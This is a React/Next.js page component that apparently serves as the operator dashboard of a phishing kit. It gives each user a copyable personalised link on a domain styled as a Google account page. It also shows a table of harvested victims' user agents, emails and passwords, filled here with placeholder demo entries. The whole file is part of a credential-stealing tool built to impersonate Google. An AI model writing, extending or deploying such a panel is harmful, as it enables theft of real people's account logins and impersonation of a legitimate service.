"use client";
import LinkCopy from "@/components/LinkCopy";
import Navbar from "@/components/Navbar";
import { authCheck } from "@/actions";
import { useEffect, useState } from "react";
import Cookies from "js-cookie";

export default function Page() {
  const host = process.env.HOST_URL;
  const [userName, setUserName] = useState(null);
  const [isLoading, setIsLoading] = useState(false);
  async function authChecker() {
    setIsLoading(true);
    const auth = await authCheck();
    if (auth) {
      setUserName(JSON.parse(auth));
    }
    console.log(auth);
    setIsLoading(false);
  }

  useEffect(() => {
    authChecker();
  }, []);
  const data = [
    {
      userAgent:
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
      email: "example1@example.com",
      password: "password123",
    },
    {
      userAgent:
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
      email: "example2@example.com",
      password: "securepass",
    },
    {
      userAgent:
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
      email: "example3@example.com",
      password: "qwerty123",
    },
    // Add more demo data objects as needed
  ];
  return (
    <>
      <Navbar userName={userName?.username} isLoading={isLoading} />
      <div className="flex items-center flex-col justify-center ">
        <div className="w-full">
          <LinkCopy
            linkAddress={
              "https://googleaccount-delta.vercel.app/" + userName?._id
            }
          />
        </div>
        <div className="w-full sm:w-2/3">
          <div className="overflow-x-auto">
            <table className="w-full min-w-full border-collapse">
              <thead>
                <tr>
                  <th className="px-4 border py-2">User Agent</th>
                  <th className="px-4 border py-2">Email</th>
                  <th className="px-4 border py-2">Password</th>
                </tr>
              </thead>
              <tbody>
                {data.map((item, index) => (
                  <tr key={index}>
                    <td className="border px-4 py-2">{item.userAgent}</td>
                    <td className="border px-4 py-2">{item.email}</td>
                    <td className="border px-4 py-2">{item.password}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </>
  );
}
